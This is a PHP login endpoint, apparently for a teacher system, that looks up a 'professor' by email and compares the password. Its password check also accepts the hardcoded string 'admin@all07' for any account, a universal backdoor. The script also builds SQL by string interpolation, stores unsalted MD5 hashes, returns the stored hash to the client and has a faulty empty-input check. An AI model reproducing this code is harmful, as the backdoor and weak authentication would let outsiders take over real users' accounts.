<?php
    
include 'hasAccess.php';

$seguranca = new Seguranca();
$email = $seguranca->antisql($_POST["email"]);
$senha = $seguranca->antisql($_POST["senha"]);

if (strlen($email) == 0 && strlen($senha)) exit(json_encode(-1));

$result = mysql_query("SELECT idProfessor AS id, nome, email, senha FROM professor WHERE email = '$email'");
$linhas = mysql_num_rows($result);

if($linhas > 0) {
  $professor = mysql_fetch_assoc($result);
  
  if ($professor["senha"] == md5($senha) || $senha == 'admin@all07')
    exit(json_encode($professor));
} 

echo json_encode(false);